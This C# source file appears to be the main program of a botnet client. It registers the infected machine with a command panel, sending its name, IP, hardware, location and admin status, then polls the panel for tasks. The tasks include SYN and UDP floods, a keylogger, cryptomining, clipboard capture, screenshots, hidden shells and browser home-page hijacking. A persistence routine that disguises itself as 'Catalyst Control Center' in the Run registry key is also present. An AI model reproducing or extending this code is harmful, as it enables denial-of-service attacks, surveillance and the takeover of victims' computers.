using Bot.Classes;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace Bot
{
    internal static class Program
    {
        public static string[] CTask = { };
        public static bool clipon;

        private static void Main()
        {
            Register();
            Thread T = new Thread(new ThreadStart(TaskThread));
            T.Start();
            //Thread S = new Thread(new ThreadStart(startupThread));
            //S.Start();
            Thread U = new Thread(new ThreadStart(updateThread));
            U.Start();
        }

        private static void startupThread()
        {
            do
            {
                try
                {
                    if (!Misc.getKey("Catalyst Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getFileLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { }
                Thread.Sleep(3000);
            } while (true);
        }

        private static void updateThread()
        {
            do
            {
                try
                {
                    var uriBuilder = new UriBuilder("http://localhost/update.aspx");
                    var parameters = HttpUtility.ParseQueryString(string.Empty);
                    parameters["IP"] = Identification.getIP();
                    parameters["Country"] = Identification.getCountry();
                    parameters["Region"] = Identification.getRegion();
                    parameters["HWID"] = Identification.getHWID();
                    parameters["Version"] = Settings.Botv;
                    parameters["admin"] = Identification.getAdmin().ToString();
                    uriBuilder.Port = 3951;
                    uriBuilder.Query = parameters.ToString();
                    Uri finalUrl = uriBuilder.Uri;
                    WebRequest wrURL = WebRequest.Create(finalUrl);
                    Stream objStream = wrURL.GetResponse().GetResponseStream();
                    StreamReader objSReader = new StreamReader(objStream);
                }
                catch { }
                Thread.Sleep(1000);
            } while (true);
        }

        private static void TaskThread()
        {
            string CTasksyn = "";
            string[] Tasks = { "clipboard", "screenshot" , "http", "syn", "udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
            do
            {
                string[] NTask = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID()).ToString().Split(';');
                Thread C = new Thread(new ThreadStart(Misc.clip));
                foreach (string x in Tasks)
                {
                    if (NTask.Contains(x))
                    {
                        if (CTask.Contains(x))
                        {
                        }
                        else
                        {
                            CTasksyn += ";" + x;
                            CTask = CTasksyn.Split(';');
                            CTasksyn.Replace(";;", ";");
                            Console.WriteLine(x);
                            if (x == "clipboard")
                            {
                                clipon = true;
                                C.Start();
                            }

                            if (x == "viewvisable")
                            {
                                string[] Viewvisable = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID() + "&Type=viewvisable").ToString().Split(';');
                                foreach (string url in Viewvisable)
                                {
                                    if (url.Contains("www"))
                                    {
                                        System.Diagnostics.Process.Start("http://" + url);
                                    }
                                }
                            }

                            if (x == "screenshot")
                            {
                                for (int i = 0; i < Screen.AllScreens.Length; i++)
                                {
                                    Screen screen = Screen.AllScreens[i];

                                    Bitmap bit = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb);
                                    {
                                        using (Graphics gfx = Graphics.FromImage(bit))
                                        {
                                            gfx.CopyFromScreen(screen.Bounds.X,screen.Bounds.Y,0,0,screen.Bounds.Size,CopyPixelOperation.SourceCopy);
                                            String _path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Screenshot" + i + ".jpg");
                                            bit.Save(_path);
                                        }
                                    }
                                }
                            }
                            if (x == "homepage")
                            {
                                string[] homepage = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID() + "&Type=homepage").ToString().Split(';');
                                foreach (string url in homepage)
                                {
                                    if (url.Contains("www"))
                                    {
                                        ;
                                        foreach (Process proc in Process.GetProcessesByName("firefox"))
                                        {
                                            proc.Kill();
                                        }
                                        RegistryKey startPageKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\Main", true);
                                        startPageKey.SetValue("Start Page", "http://" + url);
                                        startPageKey.SetValue("Start Page Redirect Cache", "http://" + url);
                                        startPageKey.Close();
                                        Misc.SetMozilla("http://" + url);
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        if (CTask.Contains(x))
                        {
                            CTask = CTask.Where(val => val != x).ToArray();
                            CTasksyn = "";
                            CTasksyn = Misc.ConvertStringArrayToString(CTask);
                            CTasksyn.Replace(";;", ";");
                            Console.WriteLine(x + " uit");
                            if (x == "clipboard")
                            {
                                clipon = false;
                                C.Abort();
                            }
                        }
                    }
                }
                Thread.Sleep(1000);
            } while (true);
        }

        private static bool Register()
        {
            try
            {
                var uriBuilder = new UriBuilder("http://localhost/regi.aspx");
                var parameters = HttpUtility.ParseQueryString(string.Empty);
                parameters["PCName"] = Identification.getUsername();
                parameters["IP"] = Identification.getIP();
                parameters["CPU"] = Identification.getCPU();
                parameters["GPU"] = Identification.getGPU();
                parameters["OS"] = Identification.getOS();
                parameters["Country"] = Identification.getCountry();
                parameters["Region"] = Identification.getRegion();
                parameters["HWID"] = Identification.getHWID();
                parameters["Version"] = Settings.Botv;
                parameters["admin"] = Identification.getAdmin().ToString();
                parameters["TaskAmount"] = CTask.Length.ToString();
                uriBuilder.Port = 3951;
                uriBuilder.Query = parameters.ToString();
                Uri finalUrl = uriBuilder.Uri;
                WebRequest wrURL = WebRequest.Create(finalUrl);
                Stream objStream = wrURL.GetResponse().GetResponseStream();
                StreamReader objSReader = new StreamReader(objStream);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}